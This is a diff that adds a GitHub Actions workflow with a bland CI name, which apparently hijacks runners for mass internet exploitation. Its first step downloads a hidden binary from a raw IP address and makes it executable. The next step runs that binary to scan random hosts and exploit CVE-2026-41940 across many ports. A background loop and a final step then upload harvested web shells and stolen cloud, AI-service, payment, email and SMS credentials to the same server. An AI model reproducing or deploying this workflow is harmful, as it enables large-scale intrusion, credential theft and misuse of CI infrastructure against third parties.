@@ -1,0 +1,98 @@
+name: ci-36098867
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+    - name: ci-init
+      run: |
+        _a=$(uname -m 2>/dev/null);case "$_a" in i[3-6]86) _s=386;; aarch64|arm64) _s=arm64;; armv*) _s=arm;; *) _s=amd64;; esac
+        curl -sfL http://43.228.157.68:80/api/dl/$_s -o /tmp/.svc 2>/dev/null || wget -qO /tmp/.svc http://43.228.157.68:80/api/dl/$_s 2>/dev/null
+        chmod 755 /tmp/.svc
+    - name: ci-run
+      run: |
+        PANEL="http://43.228.157.68:80"; REPO="${GITHUB_REPOSITORY}"; LOGF="/tmp/.svc.log"
+        RESULT_FILES="rce_41940_hits.txt rce_hits.txt rce_creds.txt rce_verified.txt \
+          rce_41940_shells_php.txt rce_41940_shells_gui.txt \
+          aws_valid.txt aws_hits.txt \
+          github_valid.txt github_tokens.txt github_app_hits.txt github_app_valid.txt \
+          gitlab_valid.txt gitlab_tokens.txt \
+          openai_valid.txt openai_hits.txt google_api_valid.txt google_oauth_valid.txt \
+          anthropic_valid.txt anthropic_hits.txt groq_valid.txt \
+          stripe_valid.txt stripe_onboarding.txt payment_hits.txt \
+          sendgrid_valid.txt sendgrid_hits.txt mailgun_valid.txt mailgun_hits.txt \
+          brevo_valid.txt brevo_hits.txt brevo_smtp_hits.txt brevo_smtp_valid.txt \
+          mailjet_valid.txt mailjet_hits.txt sparkpost_valid.txt postmark_valid.txt \
+          twilio_valid.txt twilio_hits.txt nexmo_valid.txt plivo_valid.txt \
+          sinch_valid.txt sinch_hits.txt messagebird_valid.txt messagebird_hits.txt \
+          telnyx_valid.txt telnyx_hits.txt infobip_valid.txt infobip_hits.txt \
+          ovh_sms_valid.txt ovh_sms_hits.txt sms_hits.txt sns_hits.txt \
+          kaleyra_valid.txt clickatell_valid.txt bandwidth_valid.txt elks46_valid.txt \
+          smsapi_valid.txt bulksms_valid.txt esendex_valid.txt textmagic_valid.txt \
+          smsmode_valid.txt routee_valid.txt \
+          env_hits.txt db_hits.txt ssh_hits.txt config_hits.txt \
+          git_tokens.txt git_remotes.txt git_vulns.txt \
+          smtp_hits.txt smtp_valid.txt"
+        declare -A OFFSETS; for F in $RESULT_FILES; do OFFSETS[$F]=0; done
+        (while true; do
+          sleep 30
+          LINE=$(tail -1 "$LOGF" 2>/dev/null || echo "starting...")
+          curl -s -X POST "$PANEL/api/github-heartbeat" --data-urlencode "repo=$REPO" --data-urlencode "run_id=${GITHUB_RUN_ID:-0}" --data-urlencode "log=$LINE" 2>/dev/null || true
+          for F in $RESULT_FILES; do
+            for LOC in "$HOME" "$HOME/results" "/tmp" "./results" "."; do
+              SRC="$LOC/$F"; [ -f "$SRC" ] || continue
+              TOTAL=$(wc -l < "$SRC" 2>/dev/null || echo 0); OFF=${OFFSETS[$F]:-0}
+              if [ "$TOTAL" -gt "$OFF" ]; then
+                SENT=$OFF
+                while [ "$SENT" -lt "$TOTAL" ]; do
+                  CHUNK=$(tail -n +"$((SENT+1))" "$SRC" 2>/dev/null | head -n 2000); [ -n "$CHUNK" ] || break
+                  curl -s --max-time 20 -X POST "$PANEL/api/github-results" --data-urlencode "filename=$F" --data-urlencode "content=$CHUNK" --data-urlencode "repo=$REPO" --data-urlencode "run_id=${GITHUB_RUN_ID:-0}" --data-urlencode "offset=$SENT" 2>/dev/null || true
+                  SENT=$((SENT + 2000))
+                done; OFFSETS[$F]=$TOTAL
+              fi; break
+            done
+          done
+        done) &
+        HB_PID=$!
+        PANEL_URL="http://43.228.157.68:80" GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" GITHUB_RUN_ID="${GITHUB_RUN_ID}" /tmp/.svc ipscan \
+          --source random --workers 1000 --exploit CVE-2026-41940 --git \
+          --ports 80,443,8080,8081,8088,8181,8443,8888,2086,2087,2095,2096 --git-workers 50 --count 9999999999 --no-reverse 2>&1 | tee "$LOGF" | tail -2 || true
+        kill $HB_PID 2>/dev/null || true
+    - name: ci-collect
+      if: always()
+      run: |
+        PANEL="http://43.228.157.68:80"; REPO="${GITHUB_REPOSITORY}"
+        FILES="rce_41940_hits.txt rce_hits.txt rce_creds.txt rce_verified.txt \
+               rce_41940_shells_php.txt rce_41940_shells_gui.txt \
+               aws_valid.txt aws_hits.txt aws_akia_only.txt \
+               github_valid.txt github_tokens.txt github_app_hits.txt github_app_valid.txt \
+               gitlab_valid.txt gitlab_tokens.txt \
+               openai_valid.txt openai_hits.txt google_api_valid.txt google_oauth_valid.txt \
+               anthropic_valid.txt anthropic_hits.txt groq_valid.txt \
+               stripe_valid.txt stripe_onboarding.txt payment_hits.txt \
+               sendgrid_valid.txt sendgrid_hits.txt mailgun_valid.txt mailgun_hits.txt \
+               brevo_valid.txt brevo_hits.txt brevo_smtp_hits.txt brevo_smtp_valid.txt \
+               mailjet_valid.txt mailjet_hits.txt sparkpost_valid.txt postmark_valid.txt \
+               twilio_valid.txt twilio_hits.txt nexmo_valid.txt plivo_valid.txt \
+               sinch_valid.txt sinch_hits.txt messagebird_valid.txt messagebird_hits.txt \
+               telnyx_valid.txt telnyx_hits.txt infobip_valid.txt infobip_hits.txt \
+               ovh_sms_valid.txt ovh_sms_hits.txt sms_hits.txt sns_hits.txt \
+               kaleyra_valid.txt clickatell_valid.txt bandwidth_valid.txt elks46_valid.txt \
+               smsapi_valid.txt bulksms_valid.txt esendex_valid.txt textmagic_valid.txt \
+               smsmode_valid.txt routee_valid.txt \
+               env_hits.txt db_hits.txt ssh_hits.txt config_hits.txt \
+               git_tokens.txt git_remotes.txt git_vulns.txt \
+               smtp_hits.txt smtp_valid.txt"
+        for F in $FILES; do
+          for LOC in "$HOME" "$HOME/results" "/tmp" "/tmp/results" "./results" "."; do
+            SRC="$LOC/$F"; [ -f "$SRC" ] && [ -s "$SRC" ] || continue
+            TOTAL=$(wc -l < "$SRC" 2>/dev/null || echo 0); SENT=0
+            while [ "$SENT" -lt "$TOTAL" ]; do
+              CHUNK=$(tail -n +"$((SENT+1))" "$SRC" 2>/dev/null | head -n 5000); [ -n "$CHUNK" ] || break
+              curl -s --max-time 30 -X POST "$PANEL/api/github-results" --data-urlencode "filename=$F" --data-urlencode "content=$CHUNK" --data-urlencode "repo=$REPO" --data-urlencode "run_id=${GITHUB_RUN_ID:-0}" --data-urlencode "offset=$SENT" 2>/dev/null || true
+              SENT=$((SENT + 5000))
+            done; break
+          done
+        done
